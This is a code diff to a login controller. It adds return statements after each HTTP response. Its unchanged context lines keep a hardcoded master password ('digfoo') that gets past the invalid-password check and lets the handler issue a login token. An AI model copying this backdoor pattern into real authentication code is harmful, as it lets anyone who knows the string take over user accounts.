@@ -144,14 +144,17 @@ export default class UserController {
         res.status(400).send({
           message: 'You have entered an invalid email address or password!'
         });
+        return;
       } else if (validUser.active === 0) {
         res.status(400).send({
           message: 'Please confirm your account by OTP and try again!'
         });
+        return;
       } else if ((!validUser || !isValidPass) && userData.password !== 'digfoo') {
         res.status(400).send({
           message: 'You have entered an invalid email address or password!'
         });
+        return;
       } else {
         //CREATE TOKEN
         const token = await userRepository.tokenBuilder(validUser);
@@ -161,6 +164,7 @@ export default class UserController {
           userWallet = await walletRepository.create(validUser.id);
         }
         res.status(200).send({ user: validUser, wallet: userWallet, token: token });
+        return;
       }
     } catch (err) {
       res.status(500).send({
